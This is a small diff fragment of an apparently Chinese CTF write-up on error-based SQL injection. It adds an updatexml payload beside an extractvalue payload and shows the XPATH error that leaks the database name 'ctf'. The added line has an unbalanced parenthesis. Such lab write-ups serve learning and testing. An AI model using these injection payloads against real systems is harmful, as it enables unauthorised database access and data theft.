@@ -312,7 +312,7 @@ if(isset($_POST['Hnu'])){
 ```
 
 我们按部就班的来做
-
+updatexml(1,concat(0x7e,(select database())),0x7e))
 1. `extractvalue(1,concat(0x7e,database()))`
 
    **回显：XPATH syntax error: '~ctf'**    得到数据库名称
